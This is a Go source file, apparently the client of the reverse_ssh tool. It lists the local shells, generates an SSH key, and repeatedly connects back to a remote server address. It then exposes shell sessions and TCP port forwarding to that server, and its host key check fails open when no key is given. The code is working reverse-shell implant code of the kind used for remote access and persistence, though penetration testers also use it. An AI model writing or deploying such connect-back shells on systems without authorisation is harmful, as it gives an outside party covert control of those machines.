package client

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/NHAS/reverse_ssh/internal"
	"golang.org/x/crypto/ssh"
)

var shells []string

func loadShells() (shells []string) {
	file, err := os.Open("/etc/shells")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := scanner.Text()

			if len(line) > 0 && line[0] == '#' || strings.TrimSpace(line) == "" {
				continue
			}
			shells = append(shells, strings.TrimSpace(line))
		}
	} else {
		shells = []string{
			"/bin/bash",
			"/bin/sh",
			"C:\\Windows\\System32\\cmd.exe",
			"/bin/zsh",
			"/bin/ash",
		}

	}

	output := []string{}
	log.Println("Detected Shells: ")
	for _, s := range shells {

		if stats, err := os.Stat(s); err != nil && (os.IsNotExist(err) || !stats.IsDir()) {

			fmt.Printf("Rejecting Shell: '%s' Reason: %v\n", s, err)
			continue

		}
		output = append(output, s)
		fmt.Println("\t\t", s)
	}

	return output

}

func Run(addr, serverPubKey string, reconnect bool) {

	pemBlock, err := internal.GeneratePrivateKey()
	if err != nil {
		log.Fatal("Generating private key: ", err)
	}

	sshPriv, err := ssh.ParsePrivateKey(pemBlock)
	if err != nil {
		log.Fatal("Parsing the generated ssh private key failed: ", err)
	}

	shells = loadShells()

	config := &ssh.ClientConfig{
		User: "0d87be75162ded36626cb97b0f5b5ef170465533",
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(sshPriv),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			if serverPubKey == "" { // If a server key isnt supplied, fail open. Potentially should change this for more paranoid people
				return nil
			}

			if internal.FingerprintSHA256Hex(key) != serverPubKey {
				return fmt.Errorf("Server public key invalid, expected: %s, got: %s", serverPubKey, internal.FingerprintSHA256Hex(key))
			}

			return nil
		},
	}

	once := true
	for ; once || reconnect; once = false { // My take on a golang do {} while loop :P
		log.Println("Connecting to ", addr)
		conn, err := net.DialTimeout("tcp", addr, config.Timeout)
		if err != nil {
			log.Printf("Unable to connect TCP: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}
		defer conn.Close()

		sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
		if err != nil {
			log.Printf("Unable to start a new client connection: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}
		defer sshConn.Close()

		go ssh.DiscardRequests(reqs) // Then go on to ignore everything else

		err = internal.RegisterChannelCallbacks(sshConn, chans, map[string]internal.ChannelHandler{
			"session":      shellChannel,
			"direct-tcpip": proxyChannel,
		})
		if err != nil {
			log.Printf("Server disconnected unexpectedly: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}

	}

}
